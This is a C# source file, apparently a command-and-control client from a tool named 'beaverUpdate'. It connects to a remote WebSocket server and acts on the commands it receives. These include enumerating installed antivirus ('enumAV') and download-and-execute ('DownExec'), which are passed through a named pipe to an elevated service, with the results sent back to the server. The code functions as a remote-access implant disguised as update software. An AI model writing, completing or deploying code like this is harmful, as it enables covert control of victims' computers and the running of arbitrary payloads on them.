using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.WebSockets;
using System.Threading;
using Newtonsoft.Json;
using System.Collections.Concurrent;
using System.IO.Pipes;
using System.IO;
using System.Diagnostics;

namespace beaverUpdate
{
    public class CommSDK
    {
        public static ConcurrentQueue<string> messageQueue = new ConcurrentQueue<string>();
        public static CancellationTokenSource sendCancellationTokenSource = new CancellationTokenSource();

        public static async Task ListenToWebSocketAsync(string uri)
        {
            using (ClientWebSocket webSocket = new ClientWebSocket())
            {
                try
                {
                    // Connect to the WebSocket server
                    await webSocket.ConnectAsync(new Uri(uri), CancellationToken.None);

                    byte[] buffer = new byte[1024 * 4];
                    var receiveBuffer = new ArraySegment<byte>(buffer);
                    var sendCancellationToken = sendCancellationTokenSource.Token;

                    while (webSocket.State == WebSocketState.Open)
                    {
                        // Check if there is a message to send
                        string messageToSend;
                        if (messageQueue.TryDequeue(out messageToSend))
                        {
                            byte[] messageBytes = Encoding.UTF8.GetBytes(messageToSend);
                            var sendBuffer = new ArraySegment<byte>(messageBytes);

                            await webSocket.SendAsync(sendBuffer, WebSocketMessageType.Text, true, CancellationToken.None);
                            Console.WriteLine($"Sent: {messageToSend}");
                        }

                        // Receive the message from the server
                        WebSocketReceiveResult result;

                        using (var ms = new System.IO.MemoryStream())
                        {
                            do
                            {
                                result = await webSocket.ReceiveAsync(receiveBuffer, sendCancellationToken);
                                ms.Write(receiveBuffer.Array, receiveBuffer.Offset, result.Count);
                            } while (!result.EndOfMessage);

                            // Reset the buffer and get the received message as a string
                            ms.Seek(0, System.IO.SeekOrigin.Begin);
                            using (var reader = new System.IO.StreamReader(ms))
                            {
                                string receivedText = await reader.ReadToEndAsync();

                                // Handle different types of messages
                                if (receivedText.Contains("syncregister"))
                                {
                                    Console.WriteLine($"Received: {receivedText}");
                                    // Execute async task for command1
                                    await Task.Run(() => SyncRegister());
                                }
                                else if (receivedText.Contains("syncunregister"))
                                {
                                    Console.WriteLine($"Received: {receivedText}");
                                    // Execute async task for command2
                                    await Task.Run(() => SyncUnregister());
                                } // ALL TASKS BELOW ARE RUN BY BEAVER ELEVATE SERVICE THROUGH NAMED PIPE
                                else if (receivedText.Contains("enumAV"))
                                {
                                    Console.WriteLine($"Received: {receivedText}");
                                    // Execute async task for command3
                                    await Task.Run(() => SendRequest("enumAV"));
                                }
                                else if (receivedText.Contains("DownExec")) {
                                    Console.WriteLine($"Received: {receivedText}");
                                    await Task.Run(() => SendRequest(receivedText));
                                }
                                else
                                {
                                    Console.WriteLine($"Unknown command received: {receivedText}");
                                }
                            }
                        }

                        // Wait before checking for the next message to send
                        await Task.Delay(50, sendCancellationToken);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"An error occurred: {ex.Message}");
                }
            }
        }

        private static void EnqueueMessage(string message)
        {
            // Add a new message to the queue
            messageQueue.Enqueue(message);
            // Signal that there is a new message to send
            sendCancellationTokenSource.Cancel();
        }

        private static void SyncRegister()
        {
            // Run BeaverSync /register currentuser
            Console.WriteLine($"Executing SyncRegister()");
            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string BeaverSync = "BeaverSync.exe";
            ProcessStartInfo startBUR = new ProcessStartInfo
            {
                FileName = Path.Combine(currentDirectory, BeaverSync),
                Arguments = "/register",
                UseShellExecute = true
            };
            try
            {
                Process.Start(startBUR);
            }
            catch { }
        }

        private static void SyncUnregister()
        {
            // Run BeaverSync /unregister
            Console.WriteLine($"Executing SyncUnregister()");
            string currentDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string BeaverSync = "BeaverSync.exe";
            ProcessStartInfo startBUU = new ProcessStartInfo
            {
                FileName = Path.Combine(currentDirectory, BeaverSync),
                Arguments = "/unregister",
                UseShellExecute = true
            };
            try
            {
                Process.Start(startBUU);
            }
            catch { }
        }

        private static async Task SendRequest(string command)
        {
            using (NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", "BeaverOnThePipe", PipeDirection.InOut))
            {
                Console.WriteLine("Connecting to server...");
                await pipeClient.ConnectAsync(); // Use ConnectAsync for asynchronous connection
                Console.WriteLine("Connected to server.");
                Console.WriteLine($"Sending: {command}");

                using (StreamWriter writer = new StreamWriter(pipeClient))
                {
                    await writer.WriteAsync(command); // Use WriteAsync for asynchronous writing
                    await writer.FlushAsync(); // Ensure the data is written
                }

                using (StreamReader reader = new StreamReader(pipeClient))
                {
                    string response = await reader.ReadLineAsync(); // Use ReadLineAsync for asynchronous reading
                    Console.WriteLine(response);
                    // send it back down the websocket
                    EnqueueMessage(response);
                }
            }
        }
    }
}
